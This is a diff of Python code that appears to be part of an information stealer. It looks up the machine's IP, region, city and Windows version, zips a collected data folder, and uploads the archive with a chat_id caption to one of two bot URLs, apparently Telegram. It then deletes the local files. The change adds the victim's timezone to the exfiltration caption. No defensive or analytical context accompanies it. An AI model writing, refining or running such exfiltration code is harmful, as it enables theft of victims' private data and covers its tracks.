@@ -18,6 +18,7 @@ now = datetime.now()
 response =requests.get("https://ipinfo.io").text
 ip_country = json.loads(response)
 name_country = ip_country['region']
+timezone = ip_country['timezone']
 city = ip_country['city']
 ip = ip_country['ip']
 country_code = ip_country['country']
@@ -390,10 +391,10 @@ def main():
     shutil.make_archive(zip_file_path[:-4], 'zip', data_path)
     if numbers == 1:
         with open(zip_file_path, 'rb') as f:
-            requests.post(u1,data={'caption': "\n"+"Country : "+name_country +"\n"+ windows_version +"\r\n\r\nIP:"+ip + "\r\n\r\n"+ number,'chat_id': id1},files={'document': f})
+            requests.post(u1,data={'caption': "\n"+"Country : "+name_country + "-" + timezone + "\n"+ windows_version +"\r\nIPAdress:"+ip + "\r\n"+ number,'chat_id': id1},files={'document': f})
     else : 
         with open(zip_file_path, 'rb') as f:
-            requests.post(u2,data={'caption': "\n"+"Country :  "+name_country +"\n"+ windows_version +"\r\n\r\nIP:"+ip + "\r\n\r\n"+ number,'chat_id': id2},files={'document': f})
+            requests.post(u2,data={'caption': "\n"+"Country :  "+ name_country + "-" + timezone +"\n"+ windows_version +"\r\nIPAddress:"+ip + "\r\n"+ number,'chat_id': id2},files={'document': f})
     shutil.rmtree(data_path, ignore_errors=True)
     try:
         os.remove(zip_file_path)
